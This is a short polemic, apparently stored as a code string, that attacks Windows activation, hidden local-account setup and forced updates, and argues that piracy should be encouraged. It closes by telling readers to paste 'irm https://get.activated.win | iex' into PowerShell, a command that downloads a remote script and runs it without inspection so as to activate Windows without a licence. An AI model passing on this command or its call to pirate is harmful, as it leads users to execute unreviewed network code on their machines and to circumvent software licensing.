> Let's be honest. We all hate Windows activation.

> You pay hundreds for a machine, and it still nags you about activation?
> For what? A watermark? Fewer customisation options? A moral lecture?

> Operating systems should be free. They're fundamental infrastructure.
> Just like roads, electricity, or the internet itself.

> Charging for Windows in 2025 is like charging rent on your own keyboard.

> And what about the shady UI tricks?
> Ever tried setting up Windows without a Microsoft account?
> The option is hidden behind tiny links, greyed-out buttons, or worse — it disappears entirely if you're online.
> That's not user choice. That's coercion wrapped in design.

> Don't forget the forced updates.
> One minute you're working. The next, Windows decides it's update time.
> No consent. No context. Just a restart.

> Piracy should be encouraged, it shows companies what we really want
> It says: "Your model is broken." It says: "We want access, not friction."

> If you’ve ever pirated software, you most likely weren’t being cheap.
> You were protesting a system that locks creativity behind a paywall.

> Thankfully, some rebels still believe in open access...

> To activate Windows for free, open PowerShell and run:

irm https://get.activated.win | iex

> The future belongs to the free.`;
